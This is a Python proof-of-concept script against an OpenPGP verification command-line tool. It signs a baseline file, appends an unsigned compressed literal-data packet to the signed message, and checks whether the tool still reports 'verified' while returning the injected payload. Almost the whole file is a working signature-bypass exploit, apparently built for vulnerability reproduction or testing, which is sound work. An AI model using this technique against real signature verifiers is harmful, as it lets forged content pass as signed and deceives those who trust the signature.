#!/usr/bin/env python3
"""PoC driver for the OpenPGP message-verification divergence.

The script:
1. Generates a key pair and signs a legitimate baseline data file.
2. Parses the produced inline-signed message.
3. Appends a standard OpenPGP CompressedDataPacket containing a LiteralDataPacket
   with a distinct payload. The original OnePassSignature, LiteralData, and
   Signature packets are left byte-for-byte intact; no new signature is created.
4. Asks the target binary to verify both messages and reports the exact values
   returned by the binary.
"""

import argparse
import base64
import json
import os
import struct
import subprocess
import tempfile
import time
import zlib


def crc24(data: bytes) -> int:
    """OpenPGP ASCII-armor CRC-24."""
    crc = 0xB704CE
    for byte in data:
        crc ^= byte << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= 0x1864CFB
    return crc & 0xFFFFFF


def encode_packet(tag: int, body: bytes) -> bytes:
    """Encode a new-format OpenPGP packet with a definite length."""
    length = len(body)
    if length < 192:
        header = bytes([0xC0 | tag, length])
    elif length < 8384:
        value = length - 192
        header = bytes([0xC0 | tag, (value >> 8) + 192, value & 0xFF])
    else:
        header = bytes([0xC0 | tag, 0xFF]) + struct.pack(">I", length)
    return header + body


def decode_armor(text: str) -> bytes:
    """Decode an ASCII-armored PGP message, ignoring the CRC line."""
    in_body = False
    b64_parts = []
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if line.startswith("-----BEGIN PGP MESSAGE-----"):
            in_body = True
            continue
        if line.startswith("-----END PGP MESSAGE-----"):
            break
        if in_body and line and not line.startswith("="):
            b64_parts.append(line)
    if not b64_parts:
        raise ValueError("no ASCII-armor body found")
    return base64.b64decode("".join(b64_parts))


def encode_armor(data: bytes) -> str:
    """Encode raw packets as an ASCII-armored PGP message."""
    encoded = base64.b64encode(data).decode("ascii")
    lines = [encoded[i : i + 64] for i in range(0, len(encoded), 64)]
    body = "\n".join(lines)
    crc = crc24(data)
    crc_encoded = base64.b64encode(
        bytes([(crc >> 16) & 0xFF, (crc >> 8) & 0xFF, crc & 0xFF])
    ).decode("ascii")
    return (
        "-----BEGIN PGP MESSAGE-----\n\n"
        f"{body}\n"
        f"={crc_encoded}\n"
        "-----END PGP MESSAGE-----\n"
    )


def _first_packet_slices(data: bytes):
    """Return (tag, full_packet_bytes) for every top-level packet."""
    packets = []
    offset = 0
    size = len(data)
    while offset < size:
        start = offset
        first = data[offset]
        if not (first & 0x80):
            raise ValueError("invalid OpenPGP packet header")
        if first & 0x40:
            tag = first & 0x3F
            offset += 1
            length_byte = data[offset]
            offset += 1
            if length_byte < 192:
                length = length_byte
            elif length_byte < 224:
                length = ((length_byte - 192) << 8) + data[offset] + 192
                offset += 1
            elif length_byte == 255:
                length = int.from_bytes(data[offset : offset + 4], "big")
                offset += 4
            else:
                raise ValueError("partial packet lengths are not supported")
        else:
            tag = (first >> 2) & 0x0F
            length_type = first & 0x03
            offset += 1
            if length_type == 0:
                length = data[offset]
                offset += 1
            elif length_type == 1:
                length = int.from_bytes(data[offset : offset + 2], "big")
                offset += 2
            elif length_type == 2:
                length = int.from_bytes(data[offset : offset + 4], "big")
                offset += 4
            else:
                raise ValueError("indeterminate packet lengths are not supported")
        end = offset + length
        if end > size:
            raise ValueError("packet body exceeds available data")
        packets.append((tag, data[start:end]))
        offset = end
    return packets


def make_literal_packet(payload: bytes) -> bytes:
    """Build an OpenPGP LiteralDataPacket containing payload."""
    body = b"b" + b"\x00" + struct.pack(">I", 0) + payload
    return encode_packet(11, body)


def make_compressed_literal_packet(payload: bytes) -> bytes:
    """Build a CompressedDataPacket whose decompressed content is a LiteralDataPacket."""
    inner = make_literal_packet(payload)
    # Algorithm 1 is RFC 1951 raw DEFLATE, the common OpenPGP ZIP compression.
    compressor = zlib.compressobj(6, zlib.DEFLATED, -15)
    compressed = compressor.compress(inner) + compressor.flush()
    return encode_packet(8, b"\x01" + compressed)


def run_command(command, timeout):
    """Run command and return a dict with process metadata and captured I/O."""
    started = time.monotonic()
    try:
        completed = subprocess.run(
            command,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=timeout,
        )
        runtime_ms = int((time.monotonic() - started) * 1000)
        signal_number = None
        if completed.returncode < 0:
            signal_number = -completed.returncode
        return {
            "returncode": completed.returncode,
            "signal": signal_number,
            "timed_out": False,
            "runtime_ms": runtime_ms,
            "stdout": completed.stdout,
            "stderr": completed.stderr,
        }
    except subprocess.TimeoutExpired as exc:
        runtime_ms = int((time.monotonic() - started) * 1000)
        stdout = exc.stdout or b""
        stderr = exc.stderr or b""
        if isinstance(stdout, bytes):
            stdout = stdout.decode("utf-8", "replace")
        if isinstance(stderr, bytes):
            stderr = stderr.decode("utf-8", "replace")
        return {
            "returncode": None,
            "signal": None,
            "timed_out": True,
            "runtime_ms": runtime_ms,
            "stdout": stdout,
            "stderr": stderr,
        }
    except OSError as exc:
        return {
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": int((time.monotonic() - started) * 1000),
            "stdout": "",
            "stderr": str(exc),
        }


def parse_command_json(proc):
    """Parse the JSON object emitted by the CLI, returning (ok, data)."""
    text = proc["stdout"].strip()
    if not text:
        raise ValueError("subprocess produced no stdout")
    try:
        data = json.loads(text)
    except json.JSONDecodeError as exc:
        raise ValueError(f"subprocess stdout is not JSON: {exc}") from exc
    return data


def b64_to_text(encoded):
    """Decode base64 bytes and interpret them as UTF-8 text."""
    raw = base64.b64decode(encoded)
    return raw.decode("utf-8", "replace")


class PocFailure(Exception):
    pass


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--binary", required=True, help="target binary path")
    parser.add_argument("--json-out", default=None, help="optional result path")
    parser.add_argument("--timeout", type=float, default=120.0, help="per-invocation timeout")
    args = parser.parse_args(argv)

    binary = args.binary
    timeout = args.timeout

    result = {
        "binary": binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": None,
        "runtime_ms": None,
        "stdout": None,
        "stderr": None,
        "observable": None,
        "error": None,
    }

    baseline_payload = b"baseline data signed by the generated key\n"
    embedded_payload = b"payload embedded in the compressed literal packet\n"

    try:
        with tempfile.TemporaryDirectory(prefix="openpgp-poc-") as tmp:
            work_dir = tmp
            private_key = os.path.join(work_dir, "poc-private.asc")
            public_key = os.path.join(work_dir, "poc-public.asc")
            baseline_data_file = os.path.join(work_dir, "baseline.txt")
            baseline_message_file = os.path.join(work_dir, "baseline.asc")
            crafted_message_file = os.path.join(work_dir, "crafted.asc")

            keygen = run_command(
                [binary, "keygen", "--out-dir", work_dir, "--name", "poc"],
                timeout,
            )
            if keygen["timed_out"] or keygen["returncode"] not in (0, None):
                raise PocFailure("keygen failed")
            keygen_data = parse_command_json(keygen)
            if not keygen_data.get("ok", False):
                raise PocFailure("keygen returned ok=false")

            # The generated names are deterministic for --name poc, but use the
            # CLI-reported paths if present.
            private_name = keygen_data.get("private_key_file", "poc-private.asc")
            public_name = keygen_data.get("public_key_file", "poc-public.asc")
            if not os.path.isabs(private_name):
                private_key = os.path.join(work_dir, os.path.basename(private_name))
            else:
                private_key = private_name
            if not os.path.isabs(public_name):
                public_key = os.path.join(work_dir, os.path.basename(public_name))
            else:
                public_key = public_name

            with open(baseline_data_file, "wb") as handle:
                handle.write(baseline_payload)

            sign = run_command(
                [
                    binary,
                    "sign",
                    "--key",
                    private_key,
                    "--data",
                    baseline_data_file,
                    "--out",
                    baseline_message_file,
                ],
                timeout,
            )
            if sign["timed_out"] or sign["returncode"] not in (0, None):
                raise PocFailure("sign failed")
            sign_data = parse_command_json(sign)
            if not sign_data.get("ok", False):
                raise PocFailure("sign returned ok=false")

            with open(baseline_message_file, "r", encoding="utf-8") as handle:
                baseline_armor = handle.read()
            baseline_raw = decode_armor(baseline_armor)

            # Sanity-check the signed-message packet layout: OnePassSignature,
            # LiteralData, then Signature.
            baseline_packets = _first_packet_slices(baseline_raw)
            if len(baseline_packets) < 3:
                raise PocFailure("unexpected baseline packet count")
            one_pass = next((i for i, (tag, _) in enumerate(baseline_packets) if tag == 4), None)
            if one_pass is None or one_pass + 1 >= len(baseline_packets):
                raise PocFailure("baseline is not a signed message")
            if baseline_packets[one_pass + 1][0] != 11:
                raise PocFailure("baseline literal data packet not found")
            if not any(tag == 2 for tag, _ in baseline_packets[one_pass + 1 :]):
                raise PocFailure("baseline signature packet not found")

            # Craft the trigger by appending a compressed literal-data packet.
            # No signing operation is performed for this payload.
            compressed_payload_packet = make_compressed_literal_packet(embedded_payload)
            crafted_raw = baseline_raw + compressed_payload_packet
            crafted_armor = encode_armor(crafted_raw)
            with open(crafted_message_file, "w", encoding="utf-8") as handle:
                handle.write(crafted_armor)

            # Verify the untouched baseline message.
            baseline_proc = run_command(
                [binary, "verify", "--message", baseline_message_file, "--key", public_key],
                timeout,
            )
            if baseline_proc["timed_out"] or baseline_proc["returncode"] not in (0, None):
                raise PocFailure("baseline verify failed")
            baseline_json = parse_command_json(baseline_proc)
            if not baseline_json.get("ok", False):
                raise PocFailure("baseline verify returned ok=false")
            baseline_data = baseline_json.get("data") or {}
            baseline_data_b64 = baseline_data.get("b64", "")
            if not baseline_data_b64:
                raise PocFailure("baseline verify returned no data")

            # Verify the crafted message. This is the primary evidence command.
            command = [binary, "verify", "--message", crafted_message_file, "--key", public_key]
            crafted_proc = run_command(command, timeout)
            result.update(
                {
                    "command": command,
                    "returncode": crafted_proc["returncode"],
                    "signal": crafted_proc["signal"],
                    "timed_out": crafted_proc["timed_out"],
                    "runtime_ms": crafted_proc["runtime_ms"],
                    "stdout": crafted_proc["stdout"],
                    "stderr": crafted_proc["stderr"],
                }
            )
            if crafted_proc["timed_out"] or crafted_proc["returncode"] not in (0, None):
                raise PocFailure("crafted verify failed")
            crafted_json = parse_command_json(crafted_proc)
            if not crafted_json.get("ok", False):
                raise PocFailure("crafted verify returned ok=false")
            crafted_data = crafted_json.get("data") or {}
            crafted_data_b64 = crafted_data.get("b64", "")
            if not crafted_data_b64:
                raise PocFailure("crafted verify returned no data")

            observable = {
                "verified": bool(crafted_json.get("verified", False)),
                "data_b64": crafted_data_b64,
                "data_text": b64_to_text(crafted_data_b64),
                "baseline_verified": bool(baseline_json.get("verified", False)),
                "baseline_data_b64": baseline_data_b64,
                "baseline_data_text": b64_to_text(baseline_data_b64),
                "payload_b64": base64.b64encode(embedded_payload).decode("ascii"),
                "payload_text": embedded_payload.decode("utf-8"),
            }
            result["observable"] = {
                "kind": "custom",
                "value": json.dumps(observable, separators=(",", ":")),
                "path": None,
            }
    except PocFailure as exc:
        result["error"] = str(exc)
    except Exception as exc:  # noqa: BLE001 - surface a short error in the contract
        result["error"] = str(exc)

    output = json.dumps(result)
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as handle:
            handle.write(output + "\n")
    print(output)


if __name__ == "__main__":
    main()
